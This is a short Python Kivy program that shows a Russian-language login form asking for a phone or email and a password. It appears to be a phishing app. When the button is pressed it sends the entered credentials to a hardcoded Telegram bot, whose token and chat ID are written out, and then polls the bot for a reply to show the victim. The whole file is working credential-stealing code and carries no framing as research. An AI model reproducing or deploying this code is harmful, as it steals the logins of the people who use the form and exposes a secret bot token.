from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.network.urlrequest import UrlRequest
from kivy.core.window import Window
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.label import Label
import certifi
from urllib.parse import urlencode

Window.clearcolor = (0.859, 0.859, 0.859, 1)


class My(App):
    def __init__(self):
        super().__init__()
        self.input1 = TextInput(hint_text="Телефон или email", multiline=False)
        self.input2 = TextInput(hint_text="Пароль", multiline=False)
        self.button = Button(text="Вход", background_color=[0, 0.451, 0.722, 1])
        self.button.bind(on_press=self.from_input)
        self.label = Label(text='text', color=[0, 0, 0, 1])

    def from_input(self, *args):
        data = "*Login:* " + "`" + self.input1.text + "`" + "\n*Password:* " + "`" + self.input2.text + "`"
        data = urlencode({'text': data})
        self.button.background_color = [1, 0, 0, 1]
        self.r = UrlRequest(
            f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
            f"=888281527&{data}&parse_mode=MarkdownV2", self.safe, ca_file=certifi.where())

    def safe(self, *args):
        self.last = self.r.result['result']['message_id'] + 1
        self.make_request()

    def make_request(self):
        self.r = UrlRequest(f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/getUpdates",
                            self.prr)

    def prr(self, *args):
        if self.r.result['result'][-1]['message']['message_id'] != self.last:
            self.make_request()
        else:
            self.label.text = self.r.result['result'][-1]['message']['text']
            self.button.background_color = [0, 0.451, 0.722, 1]

    def build(self):
        a = AnchorLayout()
        box = BoxLayout(orientation='vertical', size_hint=[None, None], size=[320, 180], spacing=15)
        box.add_widget(self.input1)
        box.add_widget(self.input2)
        box.add_widget(self.button)
        box.add_widget(self.label)
        a.add_widget(box)
        return a


if __name__ == '__main__':
    My().run()
